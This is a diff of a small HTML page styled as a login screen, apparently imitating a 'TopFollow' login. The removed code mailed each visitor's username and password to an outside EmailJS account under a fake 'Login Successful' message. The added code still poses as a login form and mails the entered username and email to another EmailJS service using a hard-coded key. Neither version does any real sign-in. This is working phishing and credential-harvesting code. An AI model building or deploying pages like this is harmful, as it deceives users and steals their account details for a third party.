@@ -2,7 +2,27 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TopFollow Style Login</title>
+<title>Login</title>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+emailjs.init("2pInQghRcP-YZtYCK");
+})();
+
+function sendMail(event){
+event.preventDefault();
+
+emailjs.send("service_hxul50k","template_3mjgsjk",{
+username: document.getElementById("username").value,
+email: document.getElementById("email").value
+})
+.then(function(){
+alert("Data sent successfully!");
+});
+}
+</script>
 
 <style>
 
@@ -20,25 +40,8 @@ align-items:center;
 width:340px;
 background:#f3f3f3;
 border-radius:20px;
-padding:30px 20px;
-box-shadow:0 10px 30px rgba(0,0,0,0.2);
+padding:30px;
 text-align:center;
-}
-
-.logo{
-width:80px;
-height:80px;
-background:#d8d8d8;
-border-radius:50%;
-margin:-70px auto 20px;
-display:flex;
-align-items:center;
-justify-content:center;
-font-size:30px;
-}
-
-h2{
-margin-bottom:20px;
 }
 
 input{
@@ -47,72 +50,38 @@ padding:14px;
 margin:10px 0;
 border-radius:10px;
 border:2px solid #ddd;
-font-size:15px;
 }
 
 button{
 width:95%;
 padding:15px;
-margin-top:20px;
 border:none;
 border-radius:10px;
 background:#ff9800;
 color:white;
-font-size:16px;
-cursor:pointer;
-}
-
-button:hover{
-opacity:0.9;
 }
 
 </style>
 
 </head>
-  
+
 <body>
 
 <div class="card">
 
-<div class="logo">👤</div>
-
 <h2>Login</h2>
 
-<input type="text" placeholder="Username">
+<form onsubmit="sendMail(event)">
 
-<input type="password" placeholder="Password">
+<input type="text" id="username" placeholder="Username" required>
 
-<button>Log In</button>
+<input type="email" id="email" placeholder="Email" required>
+
+<button type="submit">Log In</button>
+
+</form>
 
 </div>
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
-<script>
-
-(function(){
-emailjs.init("287g46US2fGjoY4LL");
-})();
-
-function sendLogin(){
-
-var username = document.getElementById("username").value;
-var password = document.getElementById("password").value;
-
-var params = {
-username: username,
-password: password
-};
-
-emailjs.send("service_3ux49q7","template_fn1apho",params)
-.then(function(){
-alert("Login Successful");
-});
-
-}
-
-</script>
-
-</body>
-</html>
 </body>
 </html>
